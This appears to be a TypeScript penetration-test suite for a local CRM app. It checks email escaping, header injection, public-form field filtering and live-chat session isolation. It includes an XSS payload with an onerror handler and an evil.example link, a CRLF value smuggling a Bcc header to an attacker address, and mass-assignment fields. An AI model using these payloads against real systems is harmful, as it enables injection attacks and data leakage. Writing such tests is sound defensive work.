// What strangers type reaching other people: markup in names that end up in emails (an
// invitation, a campaign merged with a contact who came through a public form), header
// injection through names, fields a public form doesn't have, and one live-chat visitor
// reading another's conversation.
import { admin, person, raw, ok, finish, stamp } from './lib.ts';

const MP = 'http://localhost:8026/api/v1';
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const json = (o: unknown) => ({ headers: { 'content-type': 'application/json' }, body: JSON.stringify(o) });
const mailTo = async (addr: string, subjectHas = '') => {
  for (let i = 0; i < 60; i++) {
    const r = await (await fetch(`${MP}/search?query=${encodeURIComponent('to:' + addr)}&limit=10`)).json();
    const m = r.messages?.find((x: any) => x.Subject.includes(subjectHas));
    if (m) return (await (await fetch(`${MP}/message/${m.ID}`)).json());
    await sleep(250);
  }
  return null;
};
const HTML = `<img src=x onerror=alert(1)><a href="https://evil.example/${stamp}">click</a>`;
const raw_markup = (html: string) => /<img[^>]*onerror|<a href="https:\/\/evil\.example/i.test(html);
const made: { forms: string[]; channels: string[] } = { forms: [], channels: [] };

try {
  // ---- names with markup in an invitation ----
  const inviter = await person('Ivo', ['users.manage']);
  await admin.patch(`/users/${inviter.id}`, { first_name: HTML, last_name: `Pen${stamp}` });
  const invitee = `invitee.${stamp}@acme.test`;
  await inviter.post('/users', { email: invitee, first_name: HTML, last_name: `Pen${stamp}`, send_invite: true });
  let mail = await mailTo(invitee);
  ok('an invitation arrives', !!mail);
  ok('markup in names is shown as text in the email, not run', mail && !raw_markup(mail.HTML) && mail.HTML.includes('&lt;img'), mail?.HTML?.slice(0, 300));

  // ---- header injection through a name ----
  const crlf = await person('Cal', ['users.manage']);
  const r1 = await admin.patch(`/users/${crlf.id}`, { first_name: `Cal\r\nBcc: stolen.${stamp}@evil.example`, last_name: `Pen${stamp}` });
  const invitee2 = `invitee2.${stamp}@acme.test`;
  await crlf.post('/users', { email: invitee2, first_name: 'Ann', last_name: `Pen${stamp}`, send_invite: true });
  mail = await mailTo(invitee2);
  const all = [...(mail?.To ?? []), ...(mail?.Cc ?? []), ...(mail?.Bcc ?? [])].map((a: any) => a.Address);
  ok('a line break in a name adds no recipients', r1.status >= 400 || (!!mail && !all.some((a: string) => a.includes('evil.example')) && !(await (await fetch(`${MP}/search?query=${encodeURIComponent(`to:stolen.${stamp}@evil.example`)}`)).json()).messages?.length), [r1.status, all]);

  // ---- a public form: markup in, campaign out; fields the form doesn't have ----
  const sam = await person('Sam');
  const form = (await admin.post('/crm/webforms', { name: `Pen form ${stamp}`, entity_type: 1, fields: [
    { label: 'First name', kind: 'text', required: true, maps_to: 'first_name' },
    { label: 'Last name', kind: 'text', maps_to: 'last_name' },
    { label: 'Email', kind: 'email', required: true, maps_to: 'email' },
  ], settings: { title: 'x', button: 'Send', success_message: 'ok' } })).data;
  made.forms.push(form.id);
  const tok = (await raw('GET', `/public/forms/${form.key}`)).json.token;
  await sleep(2100);
  const victim = `formvictim.${stamp}@example.com`;
  const sub = await raw('POST', `/public/forms/${form.key}/submit`, json({
    values: { f1: HTML, f2: `Pen${stamp}`, f3: victim, assigned_to: sam.id, stage_id: '00000000-0000-4000-8000-000000000000', title: 'Pwned', f99: 'extra', uf_secret: 'x' },
    token: tok, consent: true, assigned_to: sam.id, entity_type: 3, category_id: '00000000-0000-4000-8000-000000000000',
  }));
  ok('the form takes the submission', sub.status === 200, sub.json);
  await sleep(400);
  const lead = (await admin.get(`/crm/lead/items?q=${encodeURIComponent(victim)}`)).data.items?.[0];
  ok('fields the form doesn\'t have change nothing (not the responsible person, not the title)', lead && lead.assigned_to !== sam.id && lead.title !== 'Pwned', lead);
  // A campaign to that lead.
  const seg = (await admin.post('/marketing/segments', { name: `Pen seg ${stamp}`, entity_type: 1, filter: { q: victim } })).data;
  const camp = (await admin.post('/marketing/campaigns', { name: `Pen camp ${stamp}` })).data;
  await admin.patch(`/marketing/campaigns/${camp.id}`, { segment_ids: [seg.id], subject: `Hello {{first_name}} ${stamp}`, body: 'Dear {{first_name}},\nnews.' });
  const tester = `campaigntest.${stamp}@example.com`;
  await admin.post(`/marketing/campaigns/${camp.id}/test`, { email: tester, item_id: lead?.id });
  mail = await mailTo(tester, stamp);
  ok('a campaign merged with a stranger\'s name shows it as text', mail && !raw_markup(mail.HTML), mail?.HTML?.slice(0, 400));

  // ---- live chat: one visitor can't read another's conversation ----
  const channel = async (name: string) => (await admin.post('/chat/channels', { name, operators: [sam.id] })).data.items.find((c: any) => c.name === name);
  const ch = await channel(`Pen chat ${stamp}`), ch2 = await channel(`Pen chat 2 ${stamp}`);
  made.channels.push(ch.id, ch2.id);
  const key = ch.key, key2 = ch2.key;
  const start = (k: string, name: string) => raw('POST', `/public/chat/${k}/start`, json({ name, email: `${name.toLowerCase()}.${stamp}@example.com`, consent: true }));
  const a = (await start(key, 'Alice')).json?.token;
  const b = (await start(key, 'Brian')).json?.token;
  await raw('POST', `/public/chat/${key}/messages`, json({ token: a, body: `alice secret ${stamp}` }));
  const peek = await raw('GET', `/public/chat/${key}/session?token=${encodeURIComponent(b)}`);
  ok('a visitor sees only their own conversation', !!a && !!b && !peek.text.includes(`alice secret ${stamp}`), peek.text.slice(0, 200));
  ok('a token for one chat button is nothing on another', (await raw('GET', `/public/chat/${key2}/session?token=${encodeURIComponent(a)}`)).status === 404);
  ok('a made-up token is nothing', (await raw('GET', `/public/chat/${key}/session?token=made-up-${stamp}`)).status === 404
    && (await raw('POST', `/public/chat/${key}/messages`, json({ token: `made-up-${stamp}`, body: 'x' }))).status === 404);
} finally {
  for (const id of made.forms) await admin.del(`/crm/webforms/${id}`);
  for (const id of made.channels.filter(Boolean)) await admin.del(`/chat/channels/${id}`);
}
await finish();
